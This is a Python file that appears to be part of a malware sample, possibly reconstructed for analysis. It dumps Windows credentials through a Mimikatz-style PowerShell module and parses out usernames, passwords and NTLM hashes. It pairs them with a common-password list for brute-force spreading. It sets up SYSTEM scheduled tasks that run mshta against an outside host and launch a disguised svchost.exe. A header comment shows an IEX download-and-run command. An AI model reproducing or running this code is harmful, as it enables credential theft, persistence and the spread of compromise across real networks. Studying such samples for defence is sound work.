# ee2 = 'c:\\windows\\temp\\svvhost.exe', ee2 = 'c:\\windows\\temp\\svchost.exe'
# dl = 'c:\\windows\\system32\\svhost.exe'
# dl = 'c:\\windows\\SysWOW64\\svhost.exe'
# dl = 'c:\\windows\\system32\\drivers\\svchost.exe'
# dl = 'c:\\windows\\SysWOW64\\drivers\\svchost.exe'
# ru 指定系统账户
# sc 指定频率
# st 计划任务执行时间
# tn 计划任务名称
# tr计划任务要执行的可执行程序
# 解密base64 IEX (New-Object Net.WebClient).downloadstring('http://v.beahh.com/v'+$env:USERDOMAIN) 
# 在微步沙箱中下载样本

import os
import subprocess
import time

mkatz = "abc"
ntlist = []
userlist2 = ['', 'Administrator', 'admin']
domainlist = ['']
passlist = ['',
 '123456',
 'password',
 'qwerty',
 '12345678',
 '123456789',
 '123',
 '1234',
 '123123',
 '12345',
 '12345678',
 '123123123',
 '1234567890',
 '88888888',
 '111111111',
 '000000',
 '111111',
 '112233',
 '123321',
 '654321',
 '666666',
 '888888',
 'a123456',
 '123456a',
 '5201314',
 '1qaz2wsx',
 '1q2w3e4r',
 'qwe123',
 '123qwe',
 'a123456789',
 '123456789a',
 'baseball',
 'dragon',
 'football',
 'iloveyou',
 'password',
 'sunshine',
 'princess',
 'welcome',
 'abc123',
 'monkey',
 '!@#$%^&*',
 'charlie',
 'aa123456',
 'Aa123456',
 'admin',
 'homelesspa',
 'password1',
 '1q2w3e4r5t',
 'qwertyuiop',
 '1qaz2wsx']


def mmka():
    global userlist2
    global domainlist
    global passlist
    if os.path.exists('C:\\windows\\system32\\WindowsPowerShell\\'):
        if os.path.exists('c:/windows/temp/m.ps1'):
            if os.path.exists('c:/windows/temp/mkatz.ini'):
                print('mkatz.ini exist')
                mtime = os.path.getmtime('c:\\windows\\temp\\mkatz.ini')
                mnow = int(time.time())
                if (mnow - mtime) / 60 / 60 < 24:
                    musr = open('c:\\windows\\temp\\mkatz.ini', 'r').read()
                else:
                    print('reload mimi')
                    if 'PROGRAMFILES(X86)' in os.environ:
                        usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                    else:
                        usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                    musr = usr.stdout.read()
                    fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
                    fmk.write(musr)
                    fmk.close()
            else:
                print('reload mimi')
                if 'PROGRAMFILES(X86)' in os.environ:
                    usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                else:
                    usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                musr = usr.stdout.read()
                fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
                fmk.write(musr)
                fmk.close()
        else:
            fm = open('c:\\windows\\temp\\m.ps1', 'w')
            fm.write(mkatz)
            fm.close()
            if os.path.exists('c:/windows/temp/mkatz.ini'):
                print('mkatz.ini exist')
                mtime = os.path.getmtime('c:\\windows\\temp\\mkatz.ini')
                mnow = int(time.time())
                if (mnow - mtime) / 60 / 60 < 24:
                    print('reload mimi')
                    musr = open('c:\\windows\\temp\\mkatz.ini', 'r').read()
                else:
                    print('reload mimi')
                    if 'PROGRAMFILES(X86)' in os.environ:
                        usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                    else:
                        usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                    musr = usr.stdout.read()
                    fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
                    fmk.write(musr)
                    fmk.close()
            else:
                print('reload mimi')
                if 'PROGRAMFILES(X86)' in os.environ:
                    usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                else:
                    usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                musr = usr.stdout.read()
                fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
                fmk.write(musr)
                fmk.close()
    else:
        usr3 = subprocess.Popen('cmd /c start /b sc start Schedule&ping localhost&sc query Schedule|findstr RUNNING&&(schtasks /delete /TN Autocheck /f&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autocheck /tr "cmd.exe /c mshta http://w.beahh.com/page.html?p%COMPUTERNAME%"&schtasks /run /TN Autocheck)', stdout=subprocess.PIPE)
        usr4 = subprocess.Popen('cmd /c start /b sc start Schedule&ping localhost&sc query Schedule|findstr RUNNING&&(schtasks /delete /TN Autoscan /f&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autoscan /tr "C:\\Windows\\temp\\svchost.exe"&schtasks /run /TN Autoscan)', stdout=subprocess.PIPE)
    print('mimi over')
    usern = ''
    lmhash = ''
    nthash = ''
    tspkg = ''
    wdigest = ''
    kerberos = ''
    domain = ''
    usernull = ''
    try:
        dousr = subprocess.Popen('cmd /c wmic ntdomain get domainname', stdout=subprocess.PIPE)
        domianusr = dousr.stdout.read()
        dousr = subprocess.Popen('cmd /c net user', stdout=subprocess.PIPE)
        luser = dousr.stdout.read().split('\r\n')[:-3]
        for c in luser:
            if '-' in c:
                continue
            for j in c.split(' '):
                if '' == j:
                    continue
                if 'Guest' == j:
                    continue
                userlist2.append(j.strip())

        if '* LM' in musr:
            mmlist = musr.split('* LM')
            del mmlist[0]
            for i in mmlist:
                domaint = i.split('Domain   :')[1].split('\n')[0].strip()
                if domaint in domianusr:
                    domainlist.append(domaint)
                for ii in i.split('Authentication')[0].split('Username :')[1:]:
                    unt = ii.split('\n')[0].strip()
                    userlist2.append(unt)

                for ii in i.split('Authentication')[0].split('Password :')[1:]:
                    pwdt = ii.split('\n')[0].strip()
                    if pwdt != '(null)':
                        passlist.append(pwdt)

                passlist = list(set(passlist))
                userlist2 = list(set(userlist2))
                domainlist = list(set(domainlist))

        else:
            print('nobody logon')
        if '* NTLM' in musr:
            mmlist = musr.split('* NTLM')
            del mmlist[0]
            for i in mmlist:
                NThash = i.split(':')[1].split('\n')[0].strip()
                ntlist.append(NThash)

    except:
        print('except')




